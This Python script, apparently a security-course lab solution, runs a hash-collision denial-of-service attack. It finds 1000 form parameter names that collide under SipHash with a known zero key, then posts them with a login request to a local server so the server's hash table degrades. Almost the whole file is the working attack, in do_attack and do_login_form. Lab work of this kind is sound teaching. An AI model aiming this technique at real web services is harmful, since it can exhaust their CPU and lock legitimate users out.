import siphash
from requests import codes, Session
from collisions import find_collisions_for_n, best_hash_fn, ht_hash

LOGIN_FORM_URL = "http://localhost:8080/login"
from app.api.hash_table import HashTable, Entry

HASH_KEY = b'\x00' * 16


# def test_hash_table(diction):
#
#     htsize = 2 ** 16
#     param_ht = HashTable(htsize, HASH_KEY)
#     for param, val in diction.items():
#         param_ht.insert(param, val)


# This function will send the login form
# with the colliding parameters you specify.
def do_login_form(sess, username, password, params=None):
    data_dict = {"username": username,
                 "password": password,
                 "login": "Login"
                 }
    if not params is None:
        for i in range(len(params)):
            param_key = str(params[i])
            data_dict.update({param_key: param_key})
        # test_hash_table(data_dict)
    response = sess.post(LOGIN_FORM_URL, data_dict)
    return response


# def test_only_hash_now():
#     val = str(458).encode('utf8')
#
#     htsize = 2 ** 16
#     sip = siphash.SipHash_2_4(HASH_KEY, val).hash()
#     hs = ht_hash(key, val, htsize)
#     pass
# 9239857964030268164

def do_attack():
    sess = Session()
    # Choose any valid username and password
    uname = "victim"
    pw = "victim"
    # Put your colliding inputs in this dictionary as parameters.
    # best_hash_for_1000 = 51079
    best_hash = best_hash_fn(HASH_KEY, 1000)
    attack_dict = find_collisions_for_n(HASH_KEY, best_hash, 1000)
    response = do_login_form(sess, uname, pw, attack_dict)
    print(response)
    # test_only_hash_now()


if __name__ == '__main__':
    do_attack()
